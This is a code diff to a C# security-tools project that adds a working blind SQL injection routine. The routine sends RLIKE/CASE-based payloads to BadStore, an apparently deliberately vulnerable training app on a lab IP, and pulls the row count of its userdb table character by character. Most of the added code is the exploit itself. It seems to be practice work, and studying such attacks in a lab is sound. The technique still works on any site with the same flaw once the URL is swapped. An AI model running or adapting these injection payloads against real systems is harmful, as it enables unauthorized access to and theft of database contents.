@@ -7,6 +7,7 @@ using System.Net.Sockets;
 using Newtonsoft.Json.Linq;
 using System.Linq;
 using System.Text.RegularExpressions;
+using System.Collections.Generic;
 
 namespace CsharpSecurityTools
 {
@@ -204,6 +205,59 @@ namespace CsharpSecurityTools
                
           }
 
+          // Get rows of database
+
+
+          private static string MakeRequest(string payload)
+          {
+               string url = "http://192.168.241.128/cgi-bin/badstore.cgi?action=search&searchquery=";
+               HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url + payload);
+
+               string response = string.Empty;
+               using (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream()))
+                    response = reader.ReadToEnd();
+
+               return response;
+
+          }
+          static void GetDatabaseRow()
+          {
+               int countLength = 1;
+               for (; ;countLength++ )
+               {
+                    string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT";
+                    getCountLength += " LENGTH(IFNULL(CAST(COUNT(*)AS CHAR),0x20)) FROM";
+                    getCountLength += " userdb)="+countLength+") THEN 0x28 ELSE 0x41 END))";
+                    getCountLength += " AND 'LeSo'='LeSo";
+
+                    string response = MakeRequest(getCountLength);
+                    if (response.Contains("parentheses not balanced"))
+                         break;
+               }
+
+
+               List<byte> countBytes = new List<byte>();
+               for (int i = 1; i <= countLength; i++)
+               {
+                    for (int c = 48; c <= 58; c++)
+                    {
+                         string getCount = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
+                         getCount += " IFNULL(CAST(COUNT(*) AS CHAR), 0x20) FROM userdb),";
+                         getCount += i + ", 1))=" + c + ") THEN 0x28 ELSE 0x41 END)) AND '";
+                         string response = MakeRequest(getCount);
+
+                         if (response.Contains("parentheses not balanced"))
+                         {
+                              countBytes.Add((byte)c);
+                              break;
+                         }
+                    }
+               }
+
+               int count = int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
+               Console.WriteLine("There are "+count+" rows in the userdb table");
+          }
+
           static void Main(string[] args)
           {
                // use cmd params to replace arguments string array
@@ -223,6 +277,8 @@ namespace CsharpSecurityTools
                arguments[0] = "http://192.168.241.128/cgi-bin/badstore.cgi?searchquery=hello&action=search&x=0&y=0";
                GetParamFuzz(arguments);
                //GetParamFuzz part end
+
+               GetDatabaseRow(); // There are 23 rows in the userdb table
 
           }
 
